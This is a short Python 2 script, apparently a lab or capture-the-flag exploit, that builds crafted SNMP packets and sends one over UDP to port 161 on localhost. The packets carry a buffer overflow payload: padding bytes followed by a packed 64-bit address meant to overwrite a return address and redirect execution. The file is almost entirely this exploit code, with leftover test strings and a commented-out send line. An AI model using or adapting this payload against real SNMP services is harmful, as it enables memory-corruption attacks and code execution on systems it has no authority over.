import socket
from struct import pack
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = '\x30\x01'
data += '\x02\x01\x02'
data += '\x04\x50'+'A'*24+pack('Q',0x0000000000400824)+'B'*(80-24-8)
x = ''
for i in range(len(data)):
	x += '\\x'+str(hex(ord(data[i])))[2:]	
#s.sendto(header+version+data,('127.0.0.1',161))
test = '\x30\x01\x02\x01\x02\x04\x20\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x24\x08\x40\x00\x00\x00\x00\x00'
test1 = '\x30\x02\x04\x02\x00\x00\x00\x04\x20\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x24\x08\x40\x00\x00\x00\x00\x00'
s.sendto(test1,('127.0.0.1',161))
print s.recv(1024)

